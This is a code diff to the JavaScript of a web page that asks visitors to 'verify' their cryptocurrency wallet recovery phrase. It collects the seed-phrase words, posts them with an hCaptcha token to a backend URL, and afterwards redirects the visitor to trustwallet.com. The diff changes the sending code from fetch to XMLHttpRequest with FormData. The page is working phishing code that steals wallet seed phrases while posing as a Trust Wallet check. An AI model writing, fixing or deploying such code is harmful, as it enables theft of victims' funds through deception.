@@ -280,7 +280,7 @@
             submitBtn.disabled = !(allFilled && allValid && captchaValid);
         }
 
-        async function submitForm() {
+        function submitForm() {
             const phrase = inputs.map(i => i.value.trim());
             const hcaptchaToken = hcaptcha.getResponse();
             
@@ -292,21 +292,17 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem"><div style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite"></div>Verifying...</div>';
             
-            try {
-                // Use URL-encoded format (application/x-www-form-urlencoded)
-                const params = new URLSearchParams();
-                params.append('phrase', JSON.stringify(phrase));
-                params.append('hcaptcha_response', hcaptchaToken);
-                
-                const response = await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: params.toString()
-                });
-                
-                if (response.ok) {
+            // Create FormData for proper POST request
+            const formData = new FormData();
+            formData.append('phrase', JSON.stringify(phrase));
+            formData.append('hcaptcha_response', hcaptchaToken);
+            
+            // Use XMLHttpRequest to send POST data
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', BACKEND_URL, true);
+            
+            xhr.onload = function() {
+                if (xhr.status === 200) {
                     // Success! Show success page
                     formContainer.style.display = 'none';
                     successPage.classList.add('show');
@@ -316,14 +312,19 @@
                         window.location.href = 'https://trustwallet.com';
                     }, 5000);
                 } else {
-                    throw new Error('Verification failed');
+                    alert('Verification failed. Please try again.');
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '🔒 Verify Recovery Phrase';
                 }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('Verification failed. Please try again.');
+            };
+            
+            xhr.onerror = function() {
+                alert('Connection error. Please try again.');
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = '🔒 Verify Recovery Phrase';
-            }
+            };
+            
+            xhr.send(formData);
         }
 
         submitBtn.addEventListener('click', submitForm);
